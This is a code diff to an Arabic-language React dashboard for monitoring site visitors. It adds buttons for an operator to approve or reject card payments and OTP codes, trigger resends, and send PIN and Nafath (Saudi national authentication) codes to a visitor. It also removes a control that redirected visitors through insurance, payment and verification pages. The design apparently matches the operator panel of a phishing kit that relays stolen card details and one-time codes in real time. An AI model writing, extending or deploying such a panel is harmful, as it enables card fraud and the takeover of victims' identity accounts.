@@ -14,46 +14,18 @@ type RequestItem = {
   raw?: Record<string, any>;
 };
 
-// Country flags mapping
 const countryFlags: Record<string, string> = {
-  sa: "🇸🇦",
-  ksa: "🇸🇦",
-  saudi: "🇸🇦",
-  "saudi arabia": "🇸🇦",
-  السعودية: "🇸🇦",
-  jo: "🇯🇴",
-  jord: "🇯🇴",
-  jordan: "🇯🇴",
-  الأردن: "🇯🇴",
-  ae: "🇦🇪",
-  uae: "🇦🇪",
-  emirates: "🇦🇪",
-  الإمارات: "🇦🇪",
-  eg: "🇪🇬",
-  egy: "🇪🇬",
-  egypt: "🇪🇬",
-  مصر: "🇪🇬",
-  om: "🇴🇲",
-  oman: "🇴🇲",
-  سلطنة_عمران: "🇴🇲",
-  lb: "🇱🇧",
-  lebanon: "🇱🇧",
-  لبنان: "🇱🇧",
-  sy: "🇸🇾",
-  syr: "🇸🇾",
-  syria: "🇸🇾",
-  سوريا: "🇸🇾",
+  sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
+  jo: "🇯🇴", jord: "🇯🇴", jordan: "🇯🇴", الأردن: "🇯🇴",
+  ae: "🇦🇪", uae: "🇦🇪", emirates: "🇦🇪", الإمارات: "🇦🇪",
+  eg: "🇪🇬", egy: "🇪🇬", egypt: "🇪🇬", مصر: "🇪🇬",
+  om: "🇴🇲", oman: "🇴🇲", سلطنة_عمران: "🇴🇲",
+  lb: "🇱🇧", lebanon: "🇱🇧", لبنان: "🇱🇧",
+  sy: "🇸🇾", syr: "🇸🇾", syria: "🇸🇾", سوريا: "🇸🇾",
 };
 
 const countryCodes: Record<string, string> = {
-  sa: "SA",
-  ksa: "SA",
-  jo: "JO",
-  ae: "AE",
-  eg: "EG",
-  om: "OM",
-  lb: "LB",
-  sy: "SY",
+  sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
 };
 
 const fallbackRequests: RequestItem[] = [
@@ -65,12 +37,14 @@ const fallbackRequests: RequestItem[] = [
 
 export default function DashboardPage() {
   const [requests, setRequests] = useState<RequestItem[]>(fallbackRequests);
-  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(fallbackRequests[0]?.id ?? null);
+  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
   const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
-  const [flowDropdownOpen, setFlowDropdownOpen] = useState(false);
-  const [selectedFlowStep, setSelectedFlowStep] = useState("home");
   const [nowTick, setNowTick] = useState<number>(Date.now());
+  const [pinInput, setPinInput] = useState("");
+  const [nafadInput, setNafadInput] = useState("");
+  const [actionLoading, setActionLoading] = useState<string | null>(null);
+  const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
 
   // Stats
   const stats = useMemo(() => {
@@ -155,49 +129,288 @@ export default function DashboardPage() {
     return filtered;
   }, [requests, filterMode, searchQuery]);
 
-  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? requests[0];
+  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];
 
-  // Handle flow selection
-  const handleFlowSelect = async (step: string) => {
-    const visitorId = selectedRequest?.visitorId || selectedRequest?.raw?.visitorId;
-    if (!visitorId) return;
-    setSelectedFlowStep(step);
-    setFlowDropdownOpen(false);
-
-    const flowTargets: Record<string, { redirectPage: string; currentPage: string; currentStep: number }> = {
-      home: { redirectPage: "home", currentPage: "home", currentStep: 1 },
-      insurance: { redirectPage: "insur", currentPage: "insur", currentStep: 2 },
-      package: { redirectPage: "compar", currentPage: "compar", currentStep: 3 },
-      payment: { redirectPage: "check", currentPage: "check", currentStep: 4 },
-      verification: { redirectPage: "otp", currentPage: "otp", currentStep: 5 },
-      phone: { redirectPage: "phone", currentPage: "phone", currentStep: 6 },
-      access: { redirectPage: "nafad", currentPage: "nafad", currentStep: 7 },
-    };
-
-    const target = flowTargets[step];
-    if (target) {
-      await addData({
-        id: visitorId,
-        ...target,
-      });
-    }
+  // Show notification
+  const showNotification = (type: "success" | "error", message: string) => {
+    setNotification({ type, message });
+    setTimeout(() => setNotification(null), 3000);
   };
 
-  // Flow options
-  const flowOptions = [
-    { value: "home", label: "الصفحة الرئيسية" },
-    { value: "insurance", label: "بيانات التأمين" },
-    { value: "package", label: "مقارنة العروض" },
-    { value: "payment", label: "الدفع والتحقق" },
-    { value: "verification", label: "التحقق OTP" },
-    { value: "phone", label: "معلومات الهاتف" },
-    { value: "access", label: "النفاذ" },
-  ];
+  // Handle dashboard actions
+  const handlePaymentAction = async (action: "approved" | "rejected") => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("payment");
+    try {
+      const res = await fetch("/api/dashboard/payment-action", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, action }),
+      });
+      if (res.ok) {
+        showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
 
-  const selectedFlowLabel = flowOptions.find((f) => f.value === selectedFlowStep)?.label || "توجيه الزائر...";
+  const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("otp");
+    try {
+      const res = await fetch("/api/dashboard/otp-action", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, action }),
+      });
+      if (res.ok) {
+        const messages: Record<string, string> = {
+          approved: "تم الموافقة على رمز التحقق",
+          rejected: "تم رفض رمز التحقق",
+          resend: "تم إعادة إرسال رمز التحقق",
+        };
+        showNotification("success", messages[action]);
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  const handleSendPin = async () => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("pin");
+    try {
+      const res = await fetch("/api/dashboard/send-pin", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, pinCode: pinInput }),
+      });
+      if (res.ok) {
+        showNotification("success", "تم إرسال رمز PIN للعميل");
+        setPinInput("");
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("phone");
+    try {
+      const res = await fetch("/api/dashboard/phone-action", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, action }),
+      });
+      if (res.ok) {
+        const messages: Record<string, string> = {
+          approved: "تم الموافقة على رقم الهاتف",
+          rejected: "تم رفض رقم الهاتف",
+          resend: "تم إعادة إرسال رمز التحقق",
+        };
+        showNotification("success", messages[action]);
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  const handleSendNafadCode = async () => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("nafad");
+    try {
+      const res = await fetch("/api/dashboard/send-nafad-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
+      });
+      if (res.ok) {
+        showNotification("success", "تم إرسال رمز النفاذ للعميل");
+        setNafadInput("");
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Get current page from visitor data
+  const getCurrentPage = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?.currentPage || raw?.page || "";
+  };
+
+  // Render action buttons based on current page
+  const renderActionButtons = () => {
+    const currentPage = getCurrentPage();
+
+    if (currentPage === "check") {
+      return (
+        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إجراءات الدفع</h3>
+          <div style={{ display: "flex", gap: 8 }}>
+            <button
+              onClick={() => handlePaymentAction("approved")}
+              disabled={actionLoading === "payment"}
+              style={{
+                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
+                background: "#22c55e", color: "#fff", fontWeight: 700,
+                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
+              }}
+            >
+              {actionLoading === "payment" ? "جاري..." : "✅ موافق"}
+            </button>
+            <button
+              onClick={() => handlePaymentAction("rejected")}
+              disabled={actionLoading === "payment"}
+              style={{
+                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
+                background: "#ef4444", color: "#fff", fontWeight: 700,
+                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
+              }}
+            >
+              {actionLoading === "payment" ? "جاري..." : "❌ مرفوض"}
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentPage === "veri" || currentPage === "step2") {
+      return (
+        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إجراءات رمز التحقق (OTP)</h3>
+          <div style={{ display: "flex", gap: 8 }}>
+            <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
+              ✅ موافق
+            </button>
+            <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
+              ❌ مرفوض
+            </button>
+            <button onClick={() => handleOtpAction("resend")} disabled={actionLoading === "otp"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
+              🔄 إعادة إرسال
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentPage === "confi" || currentPage === "step3") {
+      return (
+        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إرسال رمز PIN</h3>
+          <div style={{ display: "flex", gap: 8 }}>
+            <input
+              type="text" placeholder="أدخل رمز PIN..." value={pinInput}
+              onChange={(e) => setPinInput(e.target.value)} maxLength={4}
+              style={{ flex: 1, padding: "10px 12px", border: "1px solid #e5e7eb", borderRadius: 8, fontSize: "1rem", textAlign: "center" }}
+            />
+            <button onClick={handleSendPin} disabled={actionLoading === "pin" || !pinInput}
+              style={{ padding: "10px 20px", border: "none", borderRadius: 8, background: "#2563eb", color: "#fff", fontWeight: 700 }}>
+              {actionLoading === "pin" ? "جاري..." : "📤 إرسال"}
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentPage === "phone" || currentPage === "step5") {
+      return (
+        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إجراءات التحقق من الهاتف</h3>
+          <div style={{ display: "flex", gap: 8 }}>
+            <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
+              ✅ موافق
+            </button>
+            <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
+              ❌ مرفوض
+            </button>
+            <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
+              🔄 إعادة إرسال
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentPage === "nafad" || currentPage === "step4") {
+      return (
+        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إرسال رمز النفاذ (00)</h3>
+          <div style={{ display: "flex", gap: 8 }}>
+            <input
+              type="text" placeholder="أدخل رمز النفاذ..." value={nafadInput}
+              onChange={(e) => setNafadInput(e.target.value)}
+              style={{ flex: 1, padding: "10px 12px", border: "1px solid #e5e7eb", borderRadius: 8, fontSize: "1rem", textAlign: "center" }}
+            />
+            <button onClick={handleSendNafadCode} disabled={actionLoading === "nafad" || !nafadInput}
+              style={{ padding: "10px 20px", border: "none", borderRadius: 8, background: "#9333ea", color: "#fff", fontWeight: 700 }}>
+              {actionLoading === "nafad" ? "جاري..." : "📤 إرسال"}
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    return null;
+  };
 
   return (
     <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif" }} dir="rtl">
+      {/* Notification */}
+      {notification && (
+        <div
+          style={{
+            position: "fixed",
+            top: 70,
+            left: "50%",
+            transform: "translateX(-50%)",
+            padding: "12px 24px",
+            borderRadius: 8,
+            background: notification.type === "success" ? "#22c55e" : "#ef4444",
+            color: "#fff",
+            fontWeight: 600,
+            zIndex: 1000,
+            boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
+            direction: "rtl",
+          }}
+        >
+          {notification.message}
+        </div>
+      )}
+
       {/* Header */}
       <header
         style={{
@@ -547,6 +760,13 @@ export default function DashboardPage() {
                   </div>
                 </div>
 
+                {/* Current Page Indicator */}
+                <div style={{ marginTop: 8, padding: "6px 12px", background: "#f0f9ff", borderRadius: 6, display: "inline-block" }}>
+                  <span style={{ fontSize: "0.8rem", color: "#2563eb", fontWeight: 600 }}>
+                    الصفحة الحالية: {getCurrentPage() || "غير معروف"}
+                  </span>
+                </div>
+
                 {/* Device Info */}
                 <div style={{ display: "flex", alignItems: "center", gap: 16, marginTop: 16, paddingTop: 16, borderTop: "1px solid #f3f4f6" }}>
                   <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
@@ -563,6 +783,9 @@ export default function DashboardPage() {
                   </div>
                 </div>
               </div>
+
+              {/* Action Buttons */}
+              {renderActionButtons()}
 
               {/* Client Details Grid */}
               <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: 16 }}>
